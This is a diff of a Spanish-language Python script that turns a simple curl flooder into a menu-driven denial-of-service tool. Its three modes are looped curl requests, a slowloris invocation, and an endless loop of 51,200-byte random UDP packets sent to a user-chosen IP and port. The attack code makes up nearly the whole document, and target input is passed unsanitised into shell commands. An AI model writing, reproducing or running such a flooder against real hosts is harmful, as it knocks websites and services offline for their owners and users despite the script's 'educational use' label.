@@ -1,7 +1,8 @@
 from os import system
 import time
 from colorama import Fore
-
+import socket
+import random
 user_agents={
     
     "Opera/9.61.(X11; Linux x86_64; az-IN) Presto/2.9.190 Version/12.00"
@@ -24,48 +25,68 @@ print(Fore.BLUE+"███████║╚█████╗░░░░██
 print(Fore.BLUE+"██╔══██║░╚═══██╗░░░██║░░░██╔══██╗██║░░██║"+Fore.RED+" ██║╚████║██╔══╝░░░░░██║░░░")
 print(Fore.BLUE+"██║░░██║██████╔╝░░░██║░░░██║░░██║╚█████╔╝"+Fore.RED+" ██║░╚███║███████╗░░░██║░░░")
 print(Fore.BLUE+"╚═╝░░╚═╝╚═════╝░░░░╚═╝░░░╚═╝░░╚═╝░╚════╝ "+Fore.RED+" ╚═╝░░╚══╝╚══════╝░░░╚═╝░░░")
-print(Fore.WHITE+"This is a makeshift botnet, it has only 5 devices and should not be compared to other botnets.")
-print("\nEsta es una botnet improvisada, tiene solo 5 dispositivos y no debe compararse con otras botnets.\n")
-
-sitio=input(Fore.WHITE+"Ingresa el IP, Host: ")
-treads=input("Ingresa el numero de solicitudes, default(500)\n---> ")
-print (Fore.WHITE+"Codigo de respuesta http "+Fore.RED+"404")
-
-code_response=input(Fore.WHITE+"Deseas cambiar el Codigo de respuesta?"+Fore.GREEN+" y"+Fore.WHITE+"/"+Fore.RED+"n"+Fore.WHITE+"\n---> ")
-
-if code_response == "y":
-    actual_code=input("Ingresa una ruta valida para la pagina web\n"+Fore.BLUE+"Example:"+Fore.WHITE+" Index.html"+"---> ")
-    time.sleep(2)
-    print("Conectando a los bots...")
-    time.sleep(2)
-    print("Conexion aceptada...")
-    time.sleep(2)
-    print("Enviando solicitudes...")
-    time.sleep(2)
-    if treads == "":
-        for i in range(500):
-            system("curl -s -o /dev/null "+sitio+"/"+actual_code)
-        print("Conexion terminada...")
-    
-    else:
-        for i in range(int(treads)):
-            system("curl -s -o /dev/null "+sitio+"/"+actual_code)
-        print("Conexion terminada...")
-        
-
-if code_response == "n":
-    print("Conectando a los bots...")
-    time.sleep(2)
-    print("Conexion aceptada...")
-    time.sleep(2)
-    print("Enviando solicitudes...")
-    time.sleep(2)
-    if treads == "":
-        for i in range(500):
-            system("curl -s -o /dev/null "+sitio+"/hack-74lg0-for-educational-use")
-        print("Conexion terminada...")
+method=int(input(Fore.GREEN+"\n[1]"+Fore.WHITE+"Peticiones CURL"+Fore.GREEN+"\n[2]"+Fore.WHITE+"Slowloris"+Fore.GREEN+"\n[3]"+Fore.WHITE+"Socket\n~~~~> "))
+if method == 1:
+    host=input("Ingresa el IP, Host\n~~~~> ")
+    treads=input("Ingresa el numero de solicitudes, default("+Fore.BLUE+"500"+Fore.WHITE+")\n~~~~> ")
+    code_response=input("Codigo de respuesta https"+Fore.RED+" 404"+Fore.WHITE+"\nDeseas cambiar el codigo de respuesta"+Fore.GREEN+" y"+Fore.WHITE+"/"+Fore.RED+"n"+Fore.WHITE+"\n~~~~> ")
+    if code_response == "y":
+        actual_response=input("Ingresa una ruta valida para la pagina "+Fore.BLUE+"\nExample: "+Fore.WHITE+"Index.html"+"\n~~~~>")
+        print("Iniciando solicitudes...")
+        time.sleep(1)
+        if treads == "":
+            for i in range(500):
+                system("curl -s -o /dev/null "+host+"/"+actual_response)
+            print("solicitudes terminadas...")
+        else:
+            for i in range(int(treads)):
+                system("curl -s -o /dev/null "+host+"/"+actual_response)
+            print("solicitudes terminadas...")
             
+    
+    if code_response == "n":
+        time.sleep(1)
+        if treads == "":
+            print("solicitudes terminadas...")
+            for i in range(500):
+                system("curl -s -o /dev/null "+host+"/hack-74lg0-for-educational-use")
+            print("solicitudes terminadas...")
+        else:
+            print("Iniciando solicitudes...")
+            time.sleep(1)
+            for i in range(int(treads)):
+                system("curl -s -o /dev/null "+host+"/hack-74lg0-for-educational-use")
+            print("solicitudes terminadas...")
+                
+                
+if method == 2:
+    ip=input("Ingresa el IP, Host\n~~~~> ")
+    port=input("Ingresa el puerto, default("+Fore.BLUE+"80"+Fore.WHITE+")\n~~~~> ")
+    HTTP_conexion=input("Ingresa la cantidad de conexiones\n~~~~> ")
+    if HTTP_conexion == "":
+        print("Elije la cantidad de conexiones y vuelve a intentarlo...")
+        
     else:
-        for i in range(int(treads)):
-            system("curl -s -o /dev/null "+sitio+"/hack-74lg0-for-educational-use")
-        print("Conexion terminada...")
+        if port == "":
+            print("Iniciando conexiones...")
+            system("slowloris "+ip+" -s "+HTTP_conexion+" -p 80")
+        
+        else:
+            print("Iniciando conexiones...")
+            system("slowloris "+ip+" -s "+HTTP_conexion+" -p "+port)
+            
+            
+if method == 3:
+    sock=socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    bytes=random._urandom(51200)
+    sock_socket=socket.socket(socket.AF_INET)
+    ip=input("Ingresa la IP\n~~~~> ")
+    port=input("Ingresa el puerto, default("+Fore.BLUE+"80"+Fore.WHITE+")\n~~~~>")
+    if port == "":
+        print(Fore.WHITE+"Enviando paquetes a "+Fore.YELLOW+ip+Fore.WHITE+" a travez del puerto: "+Fore.BLUE+"80")
+        while True:
+            sock.sendto(bytes, (ip,80))
+    else:
+        print(Fore.WHITE+"Enviando paquetes a "+Fore.YELLOW+ip+Fore.WHITE+" a travez del puerto: "+Fore.BLUE+port)
+        while True:
+            sock.sendto(bytes, (ip,int(port)))
